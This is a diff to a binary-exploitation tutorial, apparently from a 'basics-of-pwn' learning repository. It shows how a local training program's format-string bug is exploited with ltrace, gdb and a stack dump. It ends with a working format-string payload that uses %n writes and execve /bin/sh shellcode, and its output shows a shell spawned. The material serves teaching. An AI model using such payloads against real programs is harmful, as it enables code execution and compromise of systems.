@@ -968,8 +968,103 @@ OK. Trying it outside. It doesn't work again. Okay, let's try `ltrace` tool whic
 ~~~bash
 $ ltrace ./format-string $(python -c 'print "\xfc\xcf\xff\xff" + "\xfe\xcf\xff\xff" + "%53038u" + "%6$n" + "%12489u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
 __libc_start_main(0x80491b6, 2, 0xffffd104, 0x8049220 <unfinished ...>
-strncpy(0xffffcf88, "\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\v"..., 200)                                                        = 0xffffcf88
+strncpy(0xffffcf68, "\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\v"..., 200)                                                        = 0xffffcf88
 printf("\374\317\377\377\376\317\377\377%53038u%6$n%12489u%7$n\353\v"..., 4294955730, 0xc8, 134517204, 0��������
 ~~~
 
-It shows that the input string is placed at `0xffffcf88`. 
+It shows that the input string is placed at `0xffffcf68`. So, it says that the string is copied to this address. Lets determine this address inside gdb and next calculate the offset.
+
+~~~bash
+gef➤  unset environment LINES
+gef➤  unset environment COLUMNS
+gef➤  disas main
+Dump of assembler code for function main:
+   0x080491b6 <+0>:	endbr32
+   0x080491ba <+4>:	lea    ecx,[esp+0x4]
+   0x080491be <+8>:	and    esp,0xfffffff0
+   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
+   0x080491c4 <+14>:	push   ebp
+   0x080491c5 <+15>:	mov    ebp,esp
+   0x080491c7 <+17>:	push   ebx
+   0x080491c8 <+18>:	push   ecx
+   0x080491c9 <+19>:	sub    esp,0xd0
+   0x080491cf <+25>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
+   0x080491d4 <+30>:	add    ebx,0x2e2c
+   0x080491da <+36>:	mov    eax,ecx
+   0x080491dc <+38>:	mov    eax,DWORD PTR [eax+0x4]
+   0x080491df <+41>:	add    eax,0x4
+   0x080491e2 <+44>:	mov    eax,DWORD PTR [eax]
+   0x080491e4 <+46>:	sub    esp,0x4
+   0x080491e7 <+49>:	push   0xc8
+   0x080491ec <+54>:	push   eax
+   0x080491ed <+55>:	lea    eax,[ebp-0xd0]
+   0x080491f3 <+61>:	push   eax
+   0x080491f4 <+62>:	call   0x8049090 <strncpy@plt>
+   0x080491f9 <+67>:	add    esp,0x10
+   0x080491fc <+70>:	sub    esp,0xc
+   0x080491ff <+73>:	lea    eax,[ebp-0xd0]
+   0x08049205 <+79>:	push   eax
+   0x08049206 <+80>:	call   0x8049070 <printf@plt>
+   0x0804920b <+85>:	add    esp,0x10
+   0x0804920e <+88>:	mov    eax,0x0
+   0x08049213 <+93>:	lea    esp,[ebp-0x8]
+   0x08049216 <+96>:	pop    ecx
+   0x08049217 <+97>:	pop    ebx
+   0x08049218 <+98>:	pop    ebp
+   0x08049219 <+99>:	lea    esp,[ecx-0x4]
+   0x0804921c <+102>:	ret    
+End of assembler dump.
+ef➤  b *main + 67
+Breakpoint 1 at 0x80491f9
+gef➤  r $(python -c 'print "\xec\xcf\xff\xff" + "\xee\xcf\xff\xff" + "%53024u" + "%6$n" + "%12503u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xec\xcf\xff\xff" + "\xee\xcf\xff\xff" + "%53024u" + "%6$n" + "%12503u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
+
+Breakpoint 1, 0x080491f9 in main ()
+
+gef➤  x/100wx $esp - 0x100
+0xffffcdf0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffce00:	0x00000000	0x00000000	0xf7ffd000	0x00000000
+0xffffce10:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffce20:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffce30:	0x00000000	0xffffffff	0x00000000	0xf7dc658c
+0xffffce40:	0xf7fcb110	0x00000000	0xffffce4c	0x00000000
+0xffffce50:	0x00000000	0x00000240	0x00000340	0x00000380
+0xffffce60:	0x00000380	0x00000001	0x00000000	0x080482c2
+0xffffce70:	0x0804c014	0xf7fe19ae	0x080482c2	0xf7ffd980
+0xffffce80:	0xffffceb4	0xf7ffdb40	0xf7fcb410	0x00000001
+0xffffce90:	0xf7e48259	0xf7fe1a0a	0xf7dc46e8	0xf7fcb410
+0xffffcea0:	0xf7ffd000	0x080482a8	0x00000001	0x00000001
+0xffffceb0:	0xf7dcdedc	0xf7dc658c	0xf7dce76c	0xf7fcb110
+0xffffcec0:	0xffffcf14	0x0804c000	0xf7fa8000	0xf7fa8000
+0xffffced0:	0xffffcfd8	0xf7fe7cd4	0xffffd014	0xf7e595ce
+0xffffcee0:	0xf7fa8000	0xf7fa8000	0x0804c000	0x080491f9
+0xffffcef0:	0xffffcf08	0xffffd28c	0x000000c8	0x080491d4
+0xffffcf00:	0x00000000	0x00000000	0xffffcfec	0xffffcfee
+0xffffcf10:	0x30333525	0x25753432	0x256e2436	0x30353231
+0xffffcf20:	0x37257533	0x0beb6e24	0x31c0315b	0xb0d231c9
+0xffffcf30:	0xe880cd0b	0xfffffff0	0x6e69622f	0x0068732f
+0xffffcf40:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffcf50:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffcf60:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffcf70:	0x00000000	0x00000000	0x00000000	0x00000000
+gef➤  
+~~~
+
+You can see that the address where the strncpy function placed our input string is `0xffffcf08`. Thus, you need to determine the offset and do all calculations for exploit. I just show you my final exploit.
+
+~~~bash
+shogun@kyoto:~/repos/basics-of-pwn/content/format-string$ ./format-string $(python -c 'print "\x4c\xd0\xff\xff" + "\x4e\xd0\xff\xff" + "%53120u" + "%6$n" + "%12407u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
+L���N���
+
+=========================
+Long empty output here...
+=========================
+
+200�$ w
+ 11:30:04 up 37 min,  1 user,  load average: 0.42, 0.39, 0.35
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+shogun   tty7     :0               10:53   37:01   1:42   1.25s xfce4-session
+$
+~~~
+
+Okay, you can say that if we wouldn't have ltrace tool then we couldn't exploit the vulnerability. It is not true. Don't forget about brute-force attack and pwntools. With some brute-force script that will do all calculation and execute the exploit sooner or later you will get a shell.
